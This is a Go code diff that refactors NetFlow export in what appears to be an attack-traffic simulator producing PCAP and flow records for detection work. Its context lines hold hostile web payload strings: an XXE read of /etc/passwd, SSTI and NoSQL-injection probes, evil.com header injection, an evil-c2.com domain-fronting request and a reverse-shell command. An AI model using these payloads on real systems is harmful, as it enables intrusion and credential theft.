@@ -28,12 +28,9 @@ func runDHCPStarvation(req AttackRequest) (*AttackResult, error) {
 		}
 	}
 	flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: "255.255.255.255", SrcPort: 68, DstPort: 67, Protocol: 17, Bytes: 150000, Packets: 500, StartTime: time.Now().Add(-30 * time.Second), EndTime: time.Now()}}
-	if fw != nil && fw.Telemetry.Netflow {
-		ExportNetflowV9(fw.IPAddress, flows)
-	}
-	result.FlowCount++
-	flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, "255.255.255.255", "UDP", flows)
-	result.EventIDs = append(result.EventIDs, flowID)
+	fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, "255.255.255.255", "UDP", flows)
+	result.FlowCount += fc
+	result.EventIDs = append(result.EventIDs, fids...)
 
 	dhcpPath, dhcpErr := PCAPDHCPStarvation(req.RunID, 30)
 	if dhcpErr == nil {
@@ -63,12 +60,9 @@ func runRogueDHCP(req AttackRequest) (*AttackResult, error) {
 		}
 	}
 	flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: "255.255.255.255", SrcPort: 67, DstPort: 68, Protocol: 17, Bytes: 3000, Packets: 10, StartTime: time.Now(), EndTime: time.Now().Add(5 * time.Second)}}
-	if fw != nil && fw.Telemetry.Netflow {
-		ExportNetflowV9(fw.IPAddress, flows)
-	}
-	result.FlowCount++
-	flowID, _ := recordRunEvent(req.RunID, "netflow", "sw-core", req.AttackerIP, "255.255.255.255", "UDP", flows)
-	result.EventIDs = append(result.EventIDs, flowID)
+	fc, fids := exportFlowsAllFormats(req.RunID, fw, "sw-core", req.AttackerIP, "255.255.255.255", "UDP", flows)
+	result.FlowCount += fc
+	result.EventIDs = append(result.EventIDs, fids...)
 	roguePath, rogueErr := PCAPRogueDHCP(req.RunID, req.AttackerIP, fakeGW)
 	if rogueErr == nil {
 		result.PCAPFiles = append(result.PCAPFiles, roguePath)
@@ -96,12 +90,9 @@ func runVLANHopping(req AttackRequest) (*AttackResult, error) {
 	}
 	fw := getFirewall()
 	flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: fmt.Sprintf("10.0.%d.1", targetVLAN/10), SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: 5000, Packets: 10, StartTime: time.Now(), EndTime: time.Now().Add(2 * time.Second)}}
-	if fw != nil && fw.Telemetry.Netflow {
-		ExportNetflowV9(fw.IPAddress, flows)
-	}
-	result.FlowCount++
-	flowID, _ := recordRunEvent(req.RunID, "netflow", "sw-core", req.AttackerIP, fmt.Sprintf("vlan%d", targetVLAN), "ETH", flows)
-	result.EventIDs = append(result.EventIDs, flowID)
+	fc, fids := exportFlowsAllFormats(req.RunID, fw, "sw-core", req.AttackerIP, fmt.Sprintf("vlan%d", targetVLAN), "ETH", flows)
+	result.FlowCount += fc
+	result.EventIDs = append(result.EventIDs, fids...)
 	vlanPath, vlanErr := PCAPVLANHopping(req.RunID, req.AttackerIP, fmt.Sprintf("10.0.%d.1", targetVLAN/10), 100, uint16(targetVLAN))
 	if vlanErr == nil {
 		result.PCAPFiles = append(result.PCAPFiles, vlanPath)
@@ -132,12 +123,9 @@ func runBGPHijack(req AttackRequest) (*AttackResult, error) {
 		result.EventIDs = append(result.EventIDs, eventID)
 	}
 	flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: dev.IPAddress, SrcPort: randomPort(), DstPort: 179, Protocol: 6, Bytes: 2000, Packets: 10, StartTime: time.Now(), EndTime: time.Now().Add(5 * time.Second), TCPFlags: 0x18}}
-	if fw != nil && fw.Telemetry.Netflow {
-		ExportNetflowV9(fw.IPAddress, flows)
-	}
-	result.FlowCount++
-	flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, dev.IPAddress, "TCP", flows)
-	result.EventIDs = append(result.EventIDs, flowID)
+	fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, dev.IPAddress, "TCP", flows)
+	result.FlowCount += fc
+	result.EventIDs = append(result.EventIDs, fids...)
 	bgpPath, bgpErr := PCAPBGPHijack(req.RunID, req.AttackerIP, dev.IPAddress, prefix, 65001)
 	if bgpErr == nil {
 		result.PCAPFiles = append(result.PCAPFiles, bgpPath)
@@ -170,12 +158,9 @@ func runXXEInjection(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: 8000, Packets: 6, StartTime: time.Now(), EndTime: time.Now().Add(2 * time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 		xxePayload := []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/xml\r\n\r\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>", endpoint, targetIP))
 		xxeResp := []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
 		xxePath, xxeErr := PCAPGenericTCPExchange(req.RunID, "xxe_injection", req.AttackerIP, targetIP, 80, xxePayload, xxeResp)
@@ -210,12 +195,9 @@ func runSSTInjection(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: 4000, Packets: 8, StartTime: time.Now(), EndTime: time.Now().Add(3 * time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 		sstiPayload := []byte(fmt.Sprintf("GET %s?q={{7*7}} HTTP/1.1\r\nHost: %s\r\n\r\n", endpoint, targetIP))
 		sstiResp := []byte("HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\n49")
 		sstiPath, sstiErr := PCAPGenericTCPExchange(req.RunID, "ssti_injection", req.AttackerIP, targetIP, 80, sstiPayload, sstiResp)
@@ -247,12 +229,9 @@ func runLFIAttack(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: 6000, Packets: 12, StartTime: time.Now(), EndTime: time.Now().Add(4 * time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 		lfiPayload := []byte(fmt.Sprintf("GET %s%s HTTP/1.1\r\nHost: %s\r\n\r\n", endpoint, paths[0], targetIP))
 		lfiResp := []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
 		lfiPath, lfiErr := PCAPGenericTCPExchange(req.RunID, "lfi_attack", req.AttackerIP, targetIP, 80, lfiPayload, lfiResp)
@@ -289,12 +268,9 @@ func runSSRFAttack(req AttackRequest) (*AttackResult, error) {
 			{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: 1000, Packets: 4, StartTime: time.Now(), EndTime: time.Now().Add(time.Second), TCPFlags: 0x18},
 			{SrcIP: targetIP, DstIP: "169.254.169.254", SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: 2000, Packets: 4, StartTime: time.Now(), EndTime: time.Now().Add(time.Second), TCPFlags: 0x18},
 		}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount += len(flows)
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 		ssrfPayload := []byte(fmt.Sprintf("GET /fetch?url=%s HTTP/1.1\r\nHost: %s\r\n\r\n", targetURL, targetIP))
 		ssrfResp := []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
 		ssrfPath, ssrfErr := PCAPGenericTCPExchange(req.RunID, "ssrf_attack", req.AttackerIP, targetIP, 80, ssrfPayload, ssrfResp)
@@ -328,12 +304,9 @@ func runNoSQLInjection(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: 3000, Packets: 6, StartTime: time.Now(), EndTime: time.Now().Add(2 * time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 		nosqlPayload := []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\n\r\n{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}", endpoint, targetIP))
 		nosqlResp := []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
 		nosqlPath, nosqlErr := PCAPGenericTCPExchange(req.RunID, "nosql_injection", req.AttackerIP, targetIP, 80, nosqlPayload, nosqlResp)
@@ -367,12 +340,9 @@ func runHeaderInjection(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: 2000, Packets: 4, StartTime: time.Now(), EndTime: time.Now().Add(time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 		headerPayload := []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: evil.com\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n", endpoint))
 		headerResp := []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
 		headerPath, headerErr := PCAPGenericTCPExchange(req.RunID, "header_injection", req.AttackerIP, targetIP, 80, headerPayload, headerResp)
@@ -406,12 +376,9 @@ func runBruteForceFTP(req AttackRequest) (*AttackResult, error) {
 			time.Sleep(15 * time.Millisecond)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 21, Protocol: 6, Bytes: 3000, Packets: uint32(len(users) * 4), StartTime: time.Now(), EndTime: time.Now().Add(5 * time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		// PCAP (Option B)
 		path, _ := PCAPBruteForce(req.RunID, req.AttackerIP, targetIP, 21, "ftp", len(users), users)
@@ -443,12 +410,9 @@ func runBruteForceTelnet(req AttackRequest) (*AttackResult, error) {
 			time.Sleep(20 * time.Millisecond)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 23, Protocol: 6, Bytes: 4000, Packets: 32, StartTime: time.Now(), EndTime: time.Now().Add(8 * time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		// PCAP (Option B)
 		path, _ := PCAPBruteForce(req.RunID, req.AttackerIP, targetIP, 23, "telnet", len(users), users)
@@ -482,12 +446,9 @@ func runBruteForceSMTP(req AttackRequest) (*AttackResult, error) {
 			time.Sleep(15 * time.Millisecond)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: uint16(targetPort), Protocol: 6, Bytes: 5000, Packets: 40, StartTime: time.Now(), EndTime: time.Now().Add(10 * time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		// PCAP (Option B)
 		path, _ := PCAPBruteForce(req.RunID, req.AttackerIP, targetIP, uint16(targetPort), "smtp", 10, users)
@@ -523,12 +484,9 @@ func runBruteForceSNMP(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 161, Protocol: 17, Bytes: uint32(len(communities) * 100), Packets: uint32(len(communities)), StartTime: time.Now(), EndTime: time.Now().Add(5 * time.Second)}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "UDP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "UDP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		if attackerDev == nil || dev == nil {
 			logWarn("runBruteForceSNMP target=%s: no device with MAC address available, skipping PCAP", targetIP)
@@ -586,12 +544,9 @@ func runBruteForceWinRM(req AttackRequest) (*AttackResult, error) {
 			time.Sleep(20 * time.Millisecond)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: uint16(targetPort), Protocol: 6, Bytes: 6000, Packets: 40, StartTime: time.Now(), EndTime: time.Now().Add(8 * time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		// PCAP (Option B)
 		path, _ := PCAPBruteForce(req.RunID, req.AttackerIP, targetIP, uint16(targetPort), "winrm", len(users), users)
@@ -622,12 +577,9 @@ func runBruteForceVNC(req AttackRequest) (*AttackResult, error) {
 			time.Sleep(20 * time.Millisecond)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 5900, Protocol: 6, Bytes: 3000, Packets: 24, StartTime: time.Now(), EndTime: time.Now().Add(6 * time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		// PCAP (Option B)
 		path, _ := PCAPBruteForce(req.RunID, req.AttackerIP, targetIP, 5900, "vnc", 6, nil)
@@ -665,12 +617,9 @@ func runPassTheTicket(req AttackRequest) (*AttackResult, error) {
 			{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 88, Protocol: 17, Bytes: 2000, Packets: 6, StartTime: time.Now(), EndTime: time.Now().Add(2 * time.Second)},
 			{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 445, Protocol: 6, Bytes: 8000, Packets: 20, StartTime: time.Now(), EndTime: time.Now().Add(3 * time.Second), TCPFlags: 0x18},
 		}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount += len(flows)
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "UDP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "UDP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 		pttPath, pttErr := PCAPPassTheTicket(req.RunID, req.AttackerIP, targetIP, "CORP.LOCAL", user)
 		if pttErr == nil {
 			result.PCAPFiles = append(result.PCAPFiles, pttPath)
@@ -701,12 +650,9 @@ func runASREPRoasting(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 88, Protocol: 17, Bytes: 3000, Packets: 8, StartTime: time.Now(), EndTime: time.Now().Add(2 * time.Second)}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "UDP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "UDP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 		asrepPath, asrepErr := PCAPASREPRoasting(req.RunID, req.AttackerIP, targetIP, "CORP.LOCAL", "svc-jenkins@corp.local")
 		if asrepErr == nil {
 			result.PCAPFiles = append(result.PCAPFiles, asrepPath)
@@ -736,12 +682,9 @@ func runICMPTunnel(req AttackRequest) (*AttackResult, error) {
 		result.EventIDs = append(result.EventIDs, eventID)
 	}
 	flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: c2IP, SrcPort: 0, DstPort: 0, Protocol: 1, Bytes: uint32(count * 1400), Packets: uint32(count), StartTime: time.Now().Add(-time.Duration(count) * time.Second), EndTime: time.Now()}}
-	if fw != nil && fw.Telemetry.Netflow {
-		ExportNetflowV9(fw.IPAddress, flows)
-	}
-	result.FlowCount++
-	flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, c2IP, "ICMP", flows)
-	result.EventIDs = append(result.EventIDs, flowID)
+	fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, c2IP, "ICMP", flows)
+	result.FlowCount += fc
+	result.EventIDs = append(result.EventIDs, fids...)
 	icmpTunPath, icmpTunErr := PCAPICMPTunnel(req.RunID, req.AttackerIP, c2IP, count)
 	if icmpTunErr == nil {
 		result.PCAPFiles = append(result.PCAPFiles, icmpTunPath)
@@ -772,12 +715,9 @@ func runSMBChannel(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 445, Protocol: 6, Bytes: 50000, Packets: 100, StartTime: time.Now().Add(-300 * time.Second), EndTime: time.Now(), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		smbPath, smbErr := PCAPSMBChannel(req.RunID, req.AttackerIP, targetIP, pipe)
 		if smbErr == nil {
@@ -806,12 +746,9 @@ func runWebSocketC2(req AttackRequest) (*AttackResult, error) {
 		result.EventIDs = append(result.EventIDs, eventID)
 	}
 	flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: c2IP, SrcPort: randomPort(), DstPort: 443, Protocol: 6, Bytes: uint32(count * 2000), Packets: uint32(count * 10), StartTime: time.Now().Add(-300 * time.Second), EndTime: time.Now(), TCPFlags: 0x18}}
-	if fw != nil && fw.Telemetry.Netflow {
-		ExportNetflowV9(fw.IPAddress, flows)
-	}
-	result.FlowCount++
-	flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, c2IP, "TCP", flows)
-	result.EventIDs = append(result.EventIDs, flowID)
+	fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, c2IP, "TCP", flows)
+	result.FlowCount += fc
+	result.EventIDs = append(result.EventIDs, fids...)
 
 	wsPayload := []byte(fmt.Sprintf("ws-frame:%s", randomHexString(32)))
 	wsResp := []byte(randomHexString(32))
@@ -843,12 +780,9 @@ func runDomainFronting(req AttackRequest) (*AttackResult, error) {
 	}
 	frontIP := fmt.Sprintf("104.21.%d.%d", rand.Intn(255), rand.Intn(255))
 	flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: frontIP, SrcPort: randomPort(), DstPort: 443, Protocol: 6, Bytes: uint32(count * 3000), Packets: uint32(count * 5), StartTime: time.Now().Add(-time.Duration(count*30) * time.Second), EndTime: time.Now(), TCPFlags: 0x18}}
-	if fw != nil && fw.Telemetry.Netflow {
-		ExportNetflowV9(fw.IPAddress, flows)
-	}
-	result.FlowCount++
-	flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, frontDomain, "TCP", flows)
-	result.EventIDs = append(result.EventIDs, flowID)
+	fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, frontDomain, "TCP", flows)
+	result.FlowCount += fc
+	result.EventIDs = append(result.EventIDs, fids...)
 
 	dfPayload := []byte("GET / HTTP/1.1\r\nHost: evil-c2.com\r\n\r\n")
 	dfResp := []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
@@ -886,12 +820,9 @@ func runReverseShell(req AttackRequest) (*AttackResult, error) {
 		}
 		for idx := 0; idx < count; idx++ {
 			flows := []FlowRecord{{SrcIP: targetIP, DstIP: c2IP, SrcPort: randomPort(), DstPort: uint16(port), Protocol: 6, Bytes: uint32(rand.Intn(10000) + 500), Packets: uint32(rand.Intn(100) + 10), StartTime: time.Now().Add(-time.Duration(idx*30) * time.Second), EndTime: time.Now().Add(-time.Duration(idx*30-29) * time.Second), TCPFlags: 0x18}}
-			if fw != nil && fw.Telemetry.Netflow {
-				ExportNetflowV9(fw.IPAddress, flows)
-			}
-			result.FlowCount++
-			flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", targetIP, c2IP, "TCP", flows)
-			result.EventIDs = append(result.EventIDs, flowID)
+			fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", targetIP, c2IP, "TCP", flows)
+			result.FlowCount += fc
+			result.EventIDs = append(result.EventIDs, fids...)
 		}
 
 		rsPayload := []byte("id\n")
@@ -928,12 +859,9 @@ func runPowerShellC2(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: targetIP, DstIP: c2IP, SrcPort: randomPort(), DstPort: 443, Protocol: 6, Bytes: uint32(count * 4000), Packets: uint32(count * 8), StartTime: time.Now().Add(-time.Duration(count) * time.Minute), EndTime: time.Now(), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", targetIP, c2IP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", targetIP, c2IP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		psPayload := []byte(fmt.Sprintf("cmd:%s", randomHexString(40)))
 		psResp := []byte(randomHexString(24))
@@ -974,12 +902,9 @@ func runDNSExfil(req AttackRequest) (*AttackResult, error) {
 		dnsTarget = dnsDev.IPAddress
 	}
 	flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: dnsTarget, SrcPort: randomPort(), DstPort: 53, Protocol: 17, Bytes: uint32(dataKB * 1200), Packets: uint32(chunkCount * 2), StartTime: time.Now().Add(-time.Duration(chunkCount/10) * time.Second), EndTime: time.Now()}}
-	if fw != nil && fw.Telemetry.Netflow {
-		ExportNetflowV9(fw.IPAddress, flows)
-	}
-	result.FlowCount++
-	flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, dnsTarget, "UDP", flows)
-	result.EventIDs = append(result.EventIDs, flowID)
+	fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, dnsTarget, "UDP", flows)
+	result.FlowCount += fc
+	result.EventIDs = append(result.EventIDs, fids...)
 	dnsPath, dnsErr := PCAPDNSExfilMulti(req.RunID, req.AttackerIP, dnsTarget, domain, chunkCount)
 	if dnsErr == nil {
 		result.PCAPFiles = append(result.PCAPFiles, dnsPath)
@@ -1006,12 +931,9 @@ func runICMPExfil(req AttackRequest) (*AttackResult, error) {
 		result.EventIDs = append(result.EventIDs, eventID)
 	}
 	flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: c2IP, SrcPort: 0, DstPort: 0, Protocol: 1, Bytes: uint32(dataKB * 1024), Packets: uint32(dataKB * 1024 / 1400), StartTime: time.Now().Add(-time.Duration(dataKB*5) * time.Second), EndTime: time.Now()}}
-	if fw != nil && fw.Telemetry.Netflow {
-		ExportNetflowV9(fw.IPAddress, flows)
-	}
-	result.FlowCount++
-	flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, c2IP, "ICMP", flows)
-	result.EventIDs = append(result.EventIDs, flowID)
+	fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, c2IP, "ICMP", flows)
+	result.FlowCount += fc
+	result.EventIDs = append(result.EventIDs, fids...)
 	packetCount := dataKB * 1024 / 1400
 	if packetCount < 1 {
 		packetCount = 1
@@ -1051,12 +973,9 @@ func runWMILateral(req AttackRequest) (*AttackResult, error) {
